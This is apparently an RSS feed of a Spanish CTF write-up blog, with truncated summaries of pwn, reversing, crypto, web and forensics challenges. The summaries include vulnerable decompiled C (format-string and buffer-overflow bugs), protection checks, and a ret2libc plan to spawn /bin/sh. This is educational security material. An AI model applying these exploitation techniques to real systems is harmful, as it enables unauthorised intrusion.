$ pwninit --libc libc.so_1.6 --bin scrambler --no-template bin: scrambler libc: libc.</description></item><item><title>Scripts and Formulas</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/scripts-and-formulas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/scripts-and-formulas/</guid><description>Se nos proporcionan los siguientes archivos:
$ file * Invoice_01.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=0, Archive, ctime=Tue May 30 18:44:18 2023, mtime=Tue Jul 4 11:46:42 2023, atime=Tue May 30 18:44:18 2023, length=492032, window=hidenormalshowminimized invoice.vbs: ASCII text, with very long lines (2360), with CRLF line terminators logs.zip: Zip archive data, at least v2.0 to extract, compression method=store El archivo logs.</description></item><item><title>Secret Note</title><link>https://7rocky.github.io/ctf/other/blackhat-ctf/secret-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/blackhat-ctf/secret-note/</guid><description>Se nos proporciona un binario de 64 bits llamado main:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Si abrimos el binario en Ghidra, veremos las siguientes funciones:
void get_name() { long in_FS_OFFSET; char name[40]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); puts("Please fill in your name:"); read(0, name, 30); printf("Thank you "); printf(name); if (canary != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } } int main() { long in_FS_OFFSET; char secret[56]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); get_name(); puts("</description></item><item><title>Secure</title><link>https://7rocky.github.io/ctf/imaginaryctf/secure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/secure/</guid><description>Se nos proporciona este sitio web (https://puzzler7.imaginaryctf.org:7002/):
Dado que el nombre del reto es &amp;ldquo;Secure&amp;rdquo; y el navegador mostró una advertencia que decía que el certificado es autofirmado, deberíamos examinar el certificado.
Flag Por ejemplo, podemos usar curl con modo informativo (-v) e inseguro (-k). Y ahí está la flag, en los campos asunto y emisor del certificado:
$ curl -vk https://puzzler7.imaginaryctf.org:7002/ * Trying 137.184.207.224:7002... * Connected to puzzler7.imaginaryctf.org (137.184.207.224) port 7002 (#0) * ALPN: offers h2 * ALPN: offers http/1.</description></item><item><title>Secure Digital</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/secure-digital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/secure-digital/</guid><description>Se nos dice que alguien ha leído la clave maestra de una tarjeta microSD, y se nos dan las trazas de las señales en un archivo trace_captured.sal.
Análisis de señales Podemos usar la lógica de saleae 2 para analizar los rastros, y tenemos esto:
SPI Si investigamos un poco, descubriremos que las tarjetas microSD usan Serial Peripheral Interface (SPI) como protocolo de comunicación. Comparando las señales que tenemos con las que vemos en SPI Analyzer - User Guide, podemos concluir que el Channel 0 y el Channel 1 son MISO o MOSI, el Channel 2 es Enable y el Channel 3 es Clock, por lo que podemos añadir el analizador:</description></item><item><title>Secured Transfer</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/secured-transfer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/secured-transfer/</guid><description>Se nos proporciona un archivo binario llamado securetransfer:
$ file securetransfer securetransfer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0457997eda987eb100de85a2954fc8b8fc660a53, for GNU/Linux 3.2.0, stripped También tenemos un archivo de captura de red llamado trace.pcap.
Análisis de tráfico Comenzando por trace.pcap, podemos usar Wireshark para analizar la captura de red:
Solamente hay un segmento TCP que contiene datos:
17275a3d9163b2798392813bf5e6826657bd11426076c910a38b68c2bcbbd3a5 Ingeniería inversa Podemos usar Ghidra para leer el código descompilado en C.</description></item><item><title>Secured Transfer</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/secured-transfer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/secured-transfer/</guid><description>Se nos proporciona un archivo binario llamado securetransfer:
$ file securetransfer securetransfer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0457997eda987eb100de85a2954fc8b8fc660a53, for GNU/Linux 3.2.0, stripped También tenemos un archivo de captura de red llamado trace.pcap.
Análisis de tráfico Comenzando por trace.pcap, podemos usar Wireshark para analizar la captura de red:
Solamente hay un segmento TCP que contiene datos:
5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c Ingeniería inversa Podemos usar Ghidra para leer el código descompilado en C.</description></item><item><title>seed-sPRiNG</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/seed-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/seed-spring/</guid><description>Se nos proporciona un binario de 32 bits llamado seed_spring:
Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Ingeniería inversa Esta vez no tenemos el código fuente. Sin embargo, podemos utilizar una herramienta de ingeniería inversa (reversing) como Ghidra para descompilar el binario y obtener código en C más o menos legible. Esta es la función main:
void main() { uint local_20; uint local_1c; uint local_18; int local_14; undefined *local_10; local_10 = &amp;amp;stack0x00000004; puts("</description></item><item><title>Sekure Decrypt</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/sekure-decrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/sekure-decrypt/</guid><description>Se nos proporciona un binario llamado dec, el código fuente en C (src.c) y un archivo core (core):
$ file dec dec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=daf03fccbc32333244dc0f36e874e27457110af1, for GNU/Linux 3.2.0, with debug_info, not stripped $ file core core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './dec', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: '.</description></item><item><title>Serpentine</title><link>https://7rocky.github.io/ctf/picoctf/general-skills/serpentine/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/general-skills/serpentine/</guid><description>Se nos proporciona un script de Python que debería mostrar la flag, pero no lo hace:
import random import sys def str_xor(secret, key): # extend key to secret length new_key = key i = 0 while len(new_key) &amp;lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c, new_key_c) in zip(secret, new_key)]) flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + \ chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + \ chr(0x3a) + chr(0x0c) + chr(0x5d) + chr(0x5c) + chr(0x52) + \ chr(0x42) + chr(0x50) + chr(0x5a) + chr(0x5d) + chr(0x14) def print_flag(): flag = str_xor(flag_enc, 'enkidu') print(flag) def print_encouragement(): encouragements = ['You can do it!</description></item><item><title>Share</title><link>https://7rocky.github.io/ctf/other/hitcon-ctf/share/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hitcon-ctf/share/</guid><description>Se nos proporciona el código fuente en Python del servidor:
#!/usr/bin/env python3 from Crypto.Util.number import isPrime, getRandomRange, bytes_to_long from typing import List import os, signal class SecretSharing: def __init__(self, p: int, n: int, secret: int): self.p = p self.n = n self.poly = [secret] + [getRandomRange(0, self.p - 1) for _ in range(n - 1)] def evaluate(self, x: int) -&amp;gt; int: return ( sum([self.poly[i] * pow(x, i, self.p) for i in range(len(self.</description></item><item><title>Shattered Tablet</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/shattered-tablet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/shattered-tablet/</guid><description>Se nos proporciona un binario llamado tablet:
$ file tablet tablet: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=71ad3ff9f7e5fbf0edc75446337a0a68deb7ecd6, for GNU/Linux 3.2.0, not stripped Descompilación Si lo abrimos en Ghidra, veremos esta función main:
/* WARNING: Could not reconcile some variable overlaps */ undefined8 main(void) { undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_10 = 0; printf("</description></item><item><title>Shell time!</title><link>https://7rocky.github.io/ctf/ctflearn/binary/shell-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/shell-time/</guid><description>Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.
Ahora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(&amp;quot;cat /flag.txt&amp;quot;), como en RIP my bof.
Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento &amp;quot;/bin/sh&amp;quot;.
Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí).</description></item><item><title>Shifted</title><link>https://7rocky.github.io/ctf/imaginaryctf/shifted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/shifted/</guid><description>Se nos proporciona este código fuente en Python:
import string import random flag = open("flag.txt").read().strip() mystery_num = random.randint(100,1000) new_alphabet = list(string.ascii_lowercase + string.digits + string.punctuation) enc_flag = "" def shift(char): index = new_alphabet.index(char) new_index = (index + mystery_num) % len(new_alphabet) return new_alphabet[new_index] for char in flag: enc_flag += shift(char) mystery_num += 10 print(enc_flag) # 15[=&amp;gt;ts-!]kgjhz%6cn~";=;.1b3:&amp;gt;}sq7n'\^]42t Lo que hace el script es crear un alfabeto y un número aleatorio (mystery_num). Luego, para cifrar la flag, encuentra el índice del carácter en texto claro correspondiente, le suma el número aleatorio (módulo la longitud del alfabeto) y devuelve el carácter en ese nuevo índice.</description></item><item><title>Shooting star</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/shooting-star/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/shooting-star/</guid><description>Se nos proporciona un binario de 64 bits llamado shooting_star:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Podemos usar Ghidra para analizar el binario y mirar el código fuente descompilado en C:
void main() { setup(); write(1, &amp;amp;message, 0x5b); star(); return; } Esta función llama a star:
void star() { char option[2]; undefined input_data[64]; read(0, option, 2); if (option[0] == '1') { write(1,"</description></item><item><title>show-me-what-you-got</title><link>https://7rocky.github.io/ctf/imaginaryctf/show-me-what-you-got/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/show-me-what-you-got/</guid><description>Se nos proporciona un binario de 64 bits llamado vuln:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Si usamos Ghidra para extraer el código en C descompilado, vemos la función main:
undefined8 main() { long in_FS_OFFSET; char local_118[264]; long local_10; local_10 = *(long *) (in_FS_OFFSET + 0x28); setvbuf(stdout, (char *) 0x0, 2, 0); setvbuf(stdin, (char *) 0x0, 2, 0); puts("Send your string to be printed:"</description></item><item><title>Sickle</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/sickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/sickle/</guid><description>Se nos proporciona un código fuente en Python que verifica si la flag es correcta:
import pickle, io payload = b'\x8c\x08builtins\x8c\x07getattr\x93\x942\x8c\x08builtins\x8c\x05input\x93\x8c\x06FLAG&amp;gt; \x85R\x8c\x06encode\x86R)R\x940g0\n\x8c\x08builtins\x8c\x04dict\x93\x8c\x03get\x86R\x8c\x08builtins\x8c\x07globals\x93)R\x8c\x01f\x86R\x8c\x04seek\x86R\x94g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__add__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__mul__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x06__eq__\x86R\x940g3\ng5\n\x8c\x08builtins\x8c\x03len\x93g1\n\x85RM@\x00\x86RM\x05\x01\x86R\x85R.0g0\ng1\n\x8c\x0b__getitem__\x86R\x940M\x00\x00\x940g2\ng3\ng0\ng6\ng7\n\x85R\x8c\x06__le__\x86RM\x7f\x00\x85RMJ\x01\x86R\x85R.0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM@\x00\x86RMU\x00\x86RM"\x01\x86R\x85R0g0\ng0\n]\x94\x8c\x06append\x86R\x940g8\n\x8c\x0b__getitem__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\nfrom_bytes\x86R\x940M\x00\x00p7\n0g9\ng11\ng6\n\x8c\x08builtins\x8c\x05slice\x93g4\ng7\nM\x08\x00\x86Rg4\ng3\ng7\nM\x01\x00\x86RM\x08\x00\x86R\x86R\x85R\x8c\x06little\x86R\x85R0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM\x08\x00\x86RMw\x00\x86RM\xc9\x01\x86R\x85R0g0\n]\x94\x8c\x06append\x86R\x940g0\ng12\n\x8c\x0b__getitem__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__xor__\x86R\x940I1244422970072434993\n\x940M\x00\x00p7\n0g13\n\x8c\x08builtins\x8c\x03pow\x93g15\ng10\ng7\n\x85Rg16\n\x86RI65537\nI18446744073709551557\n\x87R\x85R0g14\ng7\n\x85Rp16\n0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM\x08\x00\x86RM\x83\x00\x86RM\xa7\x02\x86R\x85R0g0\ng12\n\x8c\x06__eq__\x86R(I8215359690687096682\nI1862662588367509514\nI8350772864914849965\nI11616510986494699232\nI3711648467207374797\nI9722127090168848805\nI16780197523811627561\nI18138828537077112905\nl\x85R.' f = io.BytesIO(payload) res = pickle.load(f) if isinstance(res, bool) and res: print("Congratulations!!") else: print("Nope") Lo que hace es cargar un payload serializado en pickle y verifica si el resultado es verdadero:
$ python3 problem.py FLAG&amp;gt; SECCON{asdf} Nope Por lo tanto, debemos analizar el contenido serializado en pickle para determinar cómo se está verificando la flag.</description></item><item><title>Sigma Technology</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/sigma-technology/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/sigma-technology/</guid><description>Se nos proporciona una página web en la que podemos modificar el color de cinco píxeles de una imagen de un perro. Podemos elegir la posición de los píxeles (x, y) y el color (valor RGB) y la imagen tiene 32x32 píxeles:
El robot clasifica la imagen como uno de estos objetos:
airplane automobile bird cat deer dog frog horse ship truck La clasificación se realiza mediante un algoritmo de Machine Learning (usando tensorflow).</description></item><item><title>signup</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/signup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/signup/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag (app.py):
from Crypto.Util.number import getPrime, getRandomRange, isPrime, inverse, long_to_bytes, bytes_to_long from hashlib import sha512 from random import SystemRandom from FLAG import flag L = 2048 N = 256 def repeating_xor_key(message, key): repeation = 1 + (len(message) // len(key)) key = key * repeation key = key[:len(message)] msg = bytes([c ^ k for c, k in zip(message, key)]) return msg def domain_params_generation(): q = getPrime(N) print(f"</description></item><item><title>Simple bof</title><link>https://7rocky.github.io/ctf/ctflearn/binary/simple-bof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/simple-bof/</guid><description>Se nos proporciona el código fuente en C de un binario y una instancia remota a la que conectarnos. Básicamente, lo que el programa hace es llamar a gets, que es vulnerable a Buffer Overflow, y luego comparar una variable local con un cierto valor:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void safeguard(); void print_flag(); void vuln() { char padding[16]; char buff[32]; int notsecret = 0xffffff00; int secret = 0xdeadbeef; memset(buff, 0, sizeof(buff)); // Zero-out the buffer.</description></item><item><title>Simple Programming</title><link>https://7rocky.github.io/ctf/ctflearn/programming/simple-programming/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/programming/simple-programming/</guid><description>Se nos proporciona un archivo llamado data.dat y nos piden contar las líneas que tienen un número de 0 que es múltiplo de 3 o que tienen un número de 1 que sea múltiplo de 2.
Podemos echar un vistazo a las primeras líneas del archivo:
$ head data.dat 0001100000101010100 110101000001111 101100011001110111 0111111010100 1010111111100011 1110011110010110 11100101010110111 10101101011 1111011101001 0001110001 Genial. La idea es iterar el archivo en cada línea y añadir 1 al contador (inicializado a 0) si la condición se cumple.</description></item><item><title>Situated</title><link>https://7rocky.github.io/ctf/imaginaryctf/situated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/situated/</guid><description>Se nos proporciona este sitio web (https://eth007.me/blog/about/):
Dado que la descripción del reto es
Can you see beyond what&amp;rsquo;s visible?
Podríamos pensar en inspeccionar el código fuente HTML del sitio web. Y allí tenemos una etiqueta img curiosa:
Flag Y de hecho, es la flag (en codificación URL, %7B es { y %7D es }):
$ curl -s https://eth007.me/blog/about/ | grep ictf &amp;lt;p&amp;gt;&amp;lt;img src="ictf%7Binsp3cting_my_site?_h0w??%7D" alt=""&amp;gt;&amp;lt;/p&amp;gt;</description></item><item><title>Slippy</title><link>https://7rocky.github.io/ctf/htb-challenges/web/slippy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/slippy/</guid><description>Tenemos un simple back-end que permite subir un archivo .tar.gz. Como tenemos un archivo Dockerfile, vamos a utilizar un contenedor de Docker en local:
Análisis del código fuente En el código fuente vemos que se trata de una aplicación sencilla en Flask (Python):
@api.route('/unslippy', methods=['POST']) def cache(): if 'file' not in request.files: return abort(400) extraction = extract_from_archive(request.files['file']) if extraction: return {'list': extraction}, 200 return '', 204 El archivo se descomprime y se escribe el /tmp:</description></item><item><title>Small StEps</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/small-steps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/small-steps/</guid><description>Se nos proporciona una instancia remota para conectarnos:
$ nc 188.166.152.84 32213 This is the second level of training. [E]ncrypt the flag. [A]bort training. &amp;gt; También se nos proporciona el código fuente de Python del servidor:
from Crypto.Util.number import getPrime, bytes_to_long FLAG = b"HTB{???????????????}" assert len(FLAG) == 20 class RSA: def __init__(self): self.q = getPrime(256) self.p = getPrime(256) self.n = self.q * self.p self.e = 3 def encrypt(self, plaintext): plaintext = bytes_to_long(plaintext) return pow(plaintext, self.</description></item><item><title>Snakecode</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/snakecode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/snakecode/</guid><description>Se nos proporciona un binario llamado chall.pyc, por lo que sabemos que es un binario compilado mediante Python:
$ file chall.pyc chall.pyc: python 2.7 byte-compiled En primer lugar, podemos extraer el código fuente en Python usando uncompyle6. Como está compilado con python2.7, podemos emplear un contenedor de Docker para ello:
$ docker run -v "$PWD":/ctf -it python:2.7 bash root@11d1f884672f:~# cd /ctf root@11d1f884672f:/ctf# pip install uncompyle6 DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020.</description></item><item><title>Snowboard</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/snowboard/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/snowboard/</guid><description>Se nos pide encontrar la flag en esta imagen:
Sin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en su contenido en crudo.
Para extraer los caracteres imprimibles de la imagen podemos utilizar strings y ver los primeros valores con head:
$ strings snowboard.jpg | head JFIF CTFlearn{CTFIsEasy!!!} Q1RGbGVhcm57U2tpQmFuZmZ9Cg== Exif Canon Canon EOS 6D Mark II GIMP 2.</description></item><item><title>So many 64s</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/so-many-64s/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/so-many-64s/</guid><description>Se nos proporciona este archivo enorme:
 Mirando los caracteres que hay y el nombre del reto, podemos deducir que se trata del resultado de codificar un cierto texto en Base64 muchas veces.
Como es posible que haya muchas codificaciones, podemos utilizar un bucle en Bash hasta que encontremos la flag en texto claro:
$ f=$(cat flag.txt); while true; do if [[ $f = CTFlearn* ]]; then echo $f; break; fi; f=$(echo $f | base64 -d); done CTFlearn{pr3tty_b4s1c_r1ght?</description></item><item><title>Sound of Silence</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/sound-of-silence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/sound-of-silence/</guid><description>Se nos proporciona un binario de 64 bits llamado sound_of_silence:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) También tenemos la librería y cargador de Glibc remoto:
$ glibc/ld-linux-x86-64.so.2 glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Space</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/space/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/space/</guid><description>Se nos proporciona un binario de 32 bits llamado space:
Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments No tiene ninguna protección, por lo que podremos ejecutar código arbitrario en la pila (stack) potencialmente para explotar una vulnerabilidad de Buffer Overflow.
Vulnerabilidad de Buffer Overflow Si ejecutamos el binario, solamente nos da una interfaz para introducir datos, y después termina:</description></item><item><title>Space pirate: Entrypoint</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-entrypoint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/space-pirate-entrypoint/</guid><description>Se nos proporciona un binario de 64 bits llamado sp_entrypoint:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Podemos ejecutarlo para ver lo que hay, dos opciones:
$ ./sp_entrypoint Authentication System ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░▒▓▓▓░░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓▒░▓▓▓▓▓ ░ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓▒░░▓▓▓░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒░▓▓░░░▓▓▓░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒▒▒▒▓▓░░░▓▓▒░░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒▒░░░▓▓░░░▓▓▒░ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▒░░░▒▓▓░░░▓▓▒ ░▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓░░░░░▓▓░░░▓▓▓ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░▓▓▓▒░░░░▓▓▒ ▓▓▒ ▓▓▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 